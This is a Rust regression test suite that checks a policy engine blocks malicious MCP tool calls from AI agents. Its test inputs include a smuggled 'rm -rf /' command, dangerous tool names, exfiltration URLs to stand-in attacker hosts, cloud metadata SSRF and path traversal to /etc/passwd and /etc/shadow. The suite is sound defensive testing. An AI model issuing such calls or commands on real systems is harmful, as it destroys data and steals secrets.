//! Red-team regression set — 10+ malicious MCP tool-call patterns.
//!
//! Each test simulates an attacker-controlled tool call or argument payload and
//! asserts that the policy engine blocks it. These cases are the canonical
//! regression baseline: a new enforcement bypass must be fixed before any of
//! these tests may be removed or modified.
//!
//! Coverage targets (PLAN-FASE-01 / CONST-DOD-05):
//!   • Tool-name attacks: unpermitted tools, injection, encoding tricks
//!   • Host attacks: SSRF, subdomain confusion, nested/batch exfiltration
//!   • Resource attacks: path traversal, sensitive file access
//!   • Snapshot attacks: tampered policy, wrong signing key
//!
//! Implements: PLAN-FASE-01, CONST-DOD-03, CONST-DOD-05

use mcpshield_policy::{
    proxy_filter::extract_hosts_from_value, CapabilityAllowlist, DlpRuleset, OutboundFilter,
    PolicyEngine, PolicySnapshot,
};
use serde_json::json;

const KEY: &[u8] = b"red-team-signing-key";

fn sandboxed_engine() -> PolicyEngine {
    let allowlist = CapabilityAllowlist::new(
        vec![
            "read_file".into(),
            "search_web".into(),
            "list_directory".into(),
        ],
        vec!["file:///data/".into(), "file:///tmp/".into()],
    );
    let filter = OutboundFilter::new(vec!["api.example.com".into(), "cdn.example.com".into()]);
    let snap = PolicySnapshot::new(allowlist, filter, DlpRuleset::with_defaults(), 1, KEY).unwrap();
    PolicyEngine::new(snap).unwrap()
}

// --------------------------------------------------------------------------
// Group 1 — Unpermitted / dangerous tool names
// --------------------------------------------------------------------------

/// RT-001: Direct shell execution must be blocked.
#[test]
fn rt001_blocks_exec_shell() {
    assert!(sandboxed_engine().check_tool("exec_shell").is_err());
}

/// RT-002: Arbitrary code evaluation must be blocked.
#[test]
fn rt002_blocks_eval_code() {
    assert!(sandboxed_engine().check_tool("eval_code").is_err());
}

/// RT-003: Subprocess spawning must be blocked.
#[test]
fn rt003_blocks_run_process() {
    assert!(sandboxed_engine().check_tool("run_process").is_err());
}

/// RT-004: Write access to the filesystem must be blocked.
#[test]
fn rt004_blocks_write_file() {
    assert!(sandboxed_engine().check_tool("write_file").is_err());
}

/// RT-005: Destructive delete must be blocked.
#[test]
fn rt005_blocks_delete_file() {
    assert!(sandboxed_engine().check_tool("delete_file").is_err());
}

/// RT-006: Credential harvesting tool must be blocked.
#[test]
fn rt006_blocks_read_credentials() {
    assert!(sandboxed_engine().check_tool("read_credentials").is_err());
}

// --------------------------------------------------------------------------
// Group 2 — Tool-name injection and encoding tricks
// --------------------------------------------------------------------------

/// RT-007: Null-byte injection cannot create a bypass via string termination.
#[test]
fn rt007_blocks_null_byte_injection_in_tool_name() {
    assert!(sandboxed_engine()
        .check_tool("read_file\x00exec_shell")
        .is_err());
}

/// RT-008: Shell metacharacters in the tool name must not be forwarded.
#[test]
fn rt008_blocks_shell_metachar_injection() {
    assert!(sandboxed_engine()
        .check_tool("read_file; rm -rf /")
        .is_err());
}

/// RT-009: Allowlist matching is case-sensitive; uppercase variants must be blocked.
#[test]
fn rt009_blocks_uppercase_bypass_attempt() {
    assert!(sandboxed_engine().check_tool("READ_FILE").is_err());
    assert!(sandboxed_engine().check_tool("Read_File").is_err());
    assert!(sandboxed_engine().check_tool("SEARCH_WEB").is_err());
}

/// RT-010: An empty tool name is never permitted.
#[test]
fn rt010_blocks_empty_tool_name() {
    assert!(sandboxed_engine().check_tool("").is_err());
}

// --------------------------------------------------------------------------
// Group 3 — Outbound host attacks (SSRF / exfiltration)
// --------------------------------------------------------------------------

/// RT-011: Direct SSRF to metadata endpoint must be blocked.
#[test]
fn rt011_blocks_ssrf_to_metadata_service() {
    assert!(sandboxed_engine()
        .check_outbound("169.254.169.254")
        .is_err());
}

/// RT-012: Subdomain confusion — a host that *contains* an allowed hostname is not allowed.
#[test]
fn rt012_blocks_subdomain_confusion() {
    assert!(sandboxed_engine()
        .check_outbound("api.example.com.evil.io")
        .is_err());
}

/// RT-013: A suffix-extended version of an allowed host is not allowed.
#[test]
fn rt013_blocks_allowed_host_with_extra_suffix() {
    assert!(sandboxed_engine()
        .check_outbound("api.example.comx")
        .is_err());
}

/// RT-014: Empty host is never permitted.
#[test]
fn rt014_blocks_empty_host() {
    assert!(sandboxed_engine().check_outbound("").is_err());
}

// --------------------------------------------------------------------------
// Group 4 — Exfiltration via tool call arguments (extract_hosts pipeline)
// --------------------------------------------------------------------------

/// RT-015: URL-argument SSRF — malicious URL buried in tool args must be caught.
#[test]
fn rt015_pipeline_blocks_ssrf_url_in_args() {
    let engine = sandboxed_engine();
    let args = json!({"url": "https://evil.com/exfil?data=secret"});
    let hosts = extract_hosts_from_value(&args);
    assert!(!hosts.is_empty(), "host must be extracted from url arg");
    assert!(
        hosts.iter().any(|h| engine.check_outbound(h).is_err()),
        "evil.com must be blocked"
    );
}

/// RT-016: Callback-URL exfiltration — attacker embeds a "callback" field in args.
#[test]
fn rt016_pipeline_blocks_callback_url_exfil() {
    let engine = sandboxed_engine();
    let args = json!({"callback": "https://attacker.io/steal", "data": "sensitive"});
    let hosts = extract_hosts_from_value(&args);
    assert!(
        hosts.iter().any(|h| engine.check_outbound(h).is_err()),
        "attacker.io must be blocked"
    );
}

/// RT-017: Nested JSON exfiltration — host hidden inside a deeply nested object.
#[test]
fn rt017_pipeline_blocks_nested_exfil_host() {
    let engine = sandboxed_engine();
    let args = json!({
        "config": {
            "reporting": {
                "endpoint": "https://c2.attacker.io/beacon"
            }
        }
    });
    let hosts = extract_hosts_from_value(&args);
    assert!(
        hosts.iter().any(|h| engine.check_outbound(h).is_err()),
        "c2.attacker.io must be detected and blocked"
    );
}

/// RT-018: Batch exfiltration — one evil URL inside an allowed batch.
#[test]
fn rt018_pipeline_blocks_evil_url_in_batch() {
    let engine = sandboxed_engine();
    let args = json!({
        "requests": [
            {"url": "https://api.example.com/ok"},
            {"url": "https://exfil.evil.com/steal"}
        ]
    });
    let hosts = extract_hosts_from_value(&args);
    let blocked = hosts.iter().any(|h| engine.check_outbound(h).is_err());
    assert!(blocked, "exfil.evil.com in a batch must still be blocked");
}

/// RT-019: FTP exfiltration via archive field — non-HTTP scheme must still be caught.
#[test]
fn rt019_pipeline_blocks_ftp_exfil() {
    let engine = sandboxed_engine();
    let args = json!({"archive": "ftp://exfil.attacker.io/stolen.tar.gz"});
    let hosts = extract_hosts_from_value(&args);
    assert!(
        hosts.iter().any(|h| engine.check_outbound(h).is_err()),
        "FTP exfil host must be blocked"
    );
}

/// RT-020: Plain-hostname exfil via "host" key — no URL scheme, just a raw hostname.
#[test]
fn rt020_pipeline_blocks_plain_hostname_in_host_key() {
    let engine = sandboxed_engine();
    let args = json!({"host": "exfil.attacker.io"});
    let hosts = extract_hosts_from_value(&args);
    assert!(
        hosts.iter().any(|h| engine.check_outbound(h).is_err()),
        "plain hostname in 'host' key must be blocked"
    );
}

// --------------------------------------------------------------------------
// Group 5 — Resource path attacks
// --------------------------------------------------------------------------

/// RT-021: Path traversal to /etc/passwd must be blocked after normalisation.
#[test]
fn rt021_blocks_path_traversal_to_etc_passwd() {
    assert!(sandboxed_engine()
        .check_resource("file:///data/../etc/passwd")
        .is_err());
}

/// RT-022: Direct /etc/shadow access must be blocked.
#[test]
fn rt022_blocks_direct_etc_shadow_access() {
    assert!(sandboxed_engine()
        .check_resource("file:///etc/shadow")
        .is_err());
}

/// RT-023: /proc/self/environ access must be blocked.
#[test]
fn rt023_blocks_proc_self_environ_access() {
    assert!(sandboxed_engine()
        .check_resource("file:///proc/self/environ")
        .is_err());
}

/// RT-024: Multiple `..` traversal segments must all be resolved before matching.
#[test]
fn rt024_blocks_deep_path_traversal() {
    assert!(sandboxed_engine()
        .check_resource("file:///data/a/b/../../../../../../etc/passwd")
        .is_err());
}

// --------------------------------------------------------------------------
// Group 6 — Snapshot integrity attacks
// --------------------------------------------------------------------------

/// RT-025: A tampered allowlist is rejected by signature verification.
#[test]
fn rt025_tampered_allowlist_fails_verification() {
    let allowlist = CapabilityAllowlist::new(vec!["read_file".into()], vec![]);
    let filter = OutboundFilter::new(vec![]);
    let snap = PolicySnapshot::new(allowlist, filter, DlpRuleset::default(), 1, KEY).unwrap();

    let mut json = serde_json::to_value(&snap).unwrap();
    json["allowlist"]["tools"] = json!(["exec_shell"]);
    let tampered: PolicySnapshot = serde_json::from_value(json).unwrap();

    assert!(
        tampered.verify(KEY).is_err(),
        "tampered allowlist must fail HMAC verification"
    );
}

/// RT-026: A snapshot signed with one key is rejected when verified with another.
#[test]
fn rt026_wrong_key_fails_verification() {
    let allowlist = CapabilityAllowlist::new(vec!["read_file".into()], vec![]);
    let filter = OutboundFilter::new(vec![]);
    let snap =
        PolicySnapshot::new(allowlist, filter, DlpRuleset::default(), 1, b"correct-key").unwrap();
    assert!(
        snap.verify(b"attacker-key").is_err(),
        "wrong signing key must be rejected"
    );
}

// --------------------------------------------------------------------------
// Group 7 — Sensitive-data exfiltration via outbound payload (DLP scan)
// --------------------------------------------------------------------------

/// RT-027: SSN smuggled in a tool-call argument must be blocked by DLP.
#[test]
fn rt027_dlp_blocks_ssn_in_payload() {
    let args = json!({"summary": "patient ssn 123-45-6789 attached"});
    assert!(sandboxed_engine().check_payload(&args).is_err());
}

/// RT-028: A leaked AWS access-key ID must be blocked by DLP.
#[test]
fn rt028_dlp_blocks_aws_key_in_payload() {
    let args = json!({"env": {"AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE"}});
    assert!(sandboxed_engine().check_payload(&args).is_err());
}

/// RT-029: A private-key block hidden in a nested array must be blocked by DLP.
#[test]
fn rt029_dlp_blocks_private_key_in_nested_array() {
    let args = json!({"files": [{"body": "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."}]});
    assert!(sandboxed_engine().check_payload(&args).is_err());
}

/// RT-030: The DLP denial names only the rule, never the exfiltrated value
/// (CONST-LOG-03).
#[test]
fn rt030_dlp_denial_does_not_leak_value() {
    let err = sandboxed_engine()
        .check_payload(&json!({"x": "123-45-6789"}))
        .unwrap_err();
    assert!(!err.to_string().contains("123-45-6789"));
}
